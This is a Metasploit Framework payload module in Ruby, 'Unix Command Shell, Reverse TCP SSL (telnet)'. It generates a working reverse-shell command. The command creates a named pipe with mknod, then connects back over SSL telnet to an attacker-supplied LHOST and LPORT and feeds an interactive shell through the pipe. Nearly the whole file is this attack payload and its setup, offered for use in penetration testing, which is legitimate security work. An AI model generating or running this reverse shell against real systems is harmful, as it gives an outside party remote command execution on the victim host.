##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcpSsl'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP SSL (telnet)',
      'Description'   => %q{
        Creates an interactive shell via mknod and telnet.
        This method works on Debian and other systems compiled
        without /dev/tcp support. This module uses the '-z'
        option included on some systems to encrypt using SSL.
        },
      'Author'        => 'RageLtMan',
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd_bash',
      'RequiredCmd'   => 'bash-tcp',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
    cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
  end
end
